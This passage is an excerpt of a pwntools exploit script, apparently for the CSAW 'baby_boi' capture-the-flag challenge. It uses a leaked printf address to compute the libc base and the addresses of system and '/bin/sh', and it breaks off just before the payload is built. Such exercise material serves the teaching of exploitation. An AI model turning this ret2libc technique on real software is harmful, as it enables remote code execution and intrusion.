4:elf = ELF('./baby_boi')
5:libc = ELF('./libc-2.27.so')
6:
7:# Connect to the server
8:p = remote('pwn.chal.csaw.io', 8000)
9:
10:# Receive the initial output and the leaked printf address
11:p.recvuntil(b'Here I am: ')
12:leaked_printf = int(p.recvline().strip(), 16)
13:
14:# Calculate libc base address
15:libc_base = leaked_printf - libc.symbols['printf']
16:log.info(f'Leaked printf: {hex(leaked_printf)}')
17:log.info(f'Libc base: {hex(libc_base)}')
18:
19:# Calculate addresses of system and "/bin/sh"
20:system_addr = libc_base + libc.symbols['system']
21:binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
22:log.info(f"System address: {hex(system_addr)}")
23:log.info(f"/bin/sh address: {hex(binsh_addr)}")
24:# Construct the payload
